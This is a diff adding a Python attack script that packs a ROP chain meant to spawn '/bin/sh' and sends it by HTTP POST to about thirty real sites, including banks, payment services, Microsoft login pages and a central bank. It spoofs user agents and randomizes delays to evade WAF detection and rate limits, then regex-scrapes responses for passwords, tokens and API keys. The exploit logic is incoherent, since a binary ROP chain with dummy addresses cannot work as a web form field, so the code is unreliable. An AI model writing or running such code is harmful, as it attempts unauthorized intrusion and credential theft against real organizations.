@@ -1,0 +1,146 @@
+import struct
+import requests
+import re
+import random
+import time
+
+# Example gadgets found from the binary (dummy addresses)
+pop_rdi = 0x40100d  # Address of the gadget `pop rdi; ret`
+pop_rsi_r15 = 0x40100f  # Address of the gadget `pop rsi; pop r15; ret`
+syscall = 0x400fe5  # Address of the syscall gadget
+bin_sh = 0x600010  # Address of the string "/bin/sh" in the binary
+
+# Build a ROP chain that spawns a shell
+rop_chain = [
+    pop_rdi,     # Gadget to set the first argument (rdi)
+    bin_sh,      # Address of "/bin/sh"
+    pop_rsi_r15, # Gadget to set second and third arguments (rsi and r15)
+    0x0,         # Null pointer (for the second argument)
+    0x0,         # Null pointer (for the third argument, r15)
+    syscall      # Trigger the syscall for execve("/bin/sh", NULL, NULL)
+]
+
+# Pack the ROP chain to send it over the network
+payload = b"A" * 512  # Overflow buffer (adjust size as needed)
+payload += b"".join([struct.pack("<Q", gadget) for gadget in rop_chain])
+
+# List of URLs to test the exploit
+target_urls = [
+    "https://okx.com",
+    "https://google.com",
+    "https://facebook.com",
+    "https://instagram.com",
+    "https://grammarly.com",
+    "http://federalreserve.gov",
+    "https://cbi.ir",
+    "https://admin.microsoft.com",
+    "https://login.microsoftonline.com",
+    "https://opensea.io",
+    "https://coinbase.com",
+    "https://t-mobile.com",
+    "https://chaturbate.com",
+    "https://uber.com",
+    "https://paypal.com",
+    "https://cash.app",
+    "https://x.com",
+    "https://okcoin.com",
+    "https://airbnb.com",
+    "https://github.com",
+    "https://starbucks.com",
+    "https://hackerone.com",
+    "https://dropbox.com",
+    "https://snapchat.com",
+    "https://capitalone.com",
+    "https://wellsfargo.com",
+    "https://discover.com",
+    "https://chase.com",
+    "https://att.com",
+    "https://apple.com",
+    "https://icloud.com",
+]
+
+# Updated sensitive keywords for juicy information
+sensitive_keywords = [
+    "password", "user", "admin", "db", "credentials", "api_key", 
+    "token", "root", "mysql", "shadow", "config", "secret", "session"
+]
+
+def random_user_agent():
+    """
+    Randomizes the User-Agent to spoof browser requests and avoid WAF detection.
+    """
+    user_agents = [
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15",
+        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
+    ]
+    return random.choice(user_agents)
+
+def obfuscate_payload(data):
+    """
+    Obfuscates or encodes the payload to avoid signature-based WAF detection.
+    Here we're URL-encoding the payload for simplicity, but other encoding strategies could be used.
+    """
+    return requests.utils.quote(data)
+
+def extract_sensitive_data(response_text):
+    """
+    Function to extract sensitive information from the server's response
+    using predefined sensitive keywords.
+    """
+    sensitive_data = []
+    
+    for keyword in sensitive_keywords:
+        # Dynamically compile the regex pattern for each keyword (case-insensitive)
+        pattern = re.compile(rf'({keyword}\s*[:=]\s*[^\s]+)', re.IGNORECASE)
+        matches = pattern.findall(response_text)
+        
+        if matches:
+            sensitive_data.extend(matches)
+    
+    return sensitive_data
+
+def perform_exploit(url):
+    """
+    Function to send the payload to the target URL and process the response
+    for sensitive data.
+    """
+    print(f"Testing {url} for vulnerability...")
+
+    # Use a randomized User-Agent header to avoid detection
+    headers = {
+        'User-Agent': random_user_agent(),
+        'Content-Type': 'application/x-www-form-urlencoded',
+    }
+
+    # Obfuscate the payload before sending it
+    encoded_payload = obfuscate_payload(payload.decode('latin1'))
+
+    try:
+        # Send the payload to the target
+        response = requests.post(url, data={"exploit": encoded_payload}, headers=headers, timeout=10)
+
+        if response.status_code == 200:
+            # Extract sensitive data from the response
+            sensitive_data = extract_sensitive_data(response.text)
+
+            if sensitive_data:
+                print("-------------------------------------------------------")
+                print("Sensitive data found!")
+                print("-------------------------------------------------------")
+                for item in sensitive_data:
+                    print(item)
+                print("-------------------------------------------------------")
+            else:
+                print(f"No sensitive data found on {url}.")
+        else:
+            print(f"Failed to send payload to {url} (Status Code: {response.status_code})")
+
+    except requests.exceptions.RequestException as e:
+        print(f"Error connecting to {url}: {e}")
+
+# Run the exploit for each target URL with randomized timing to avoid rate-limiting
+for url in target_urls:
+    perform_exploit(url)
+    time.sleep(random.uniform(1, 5))  # Randomized delay between requests
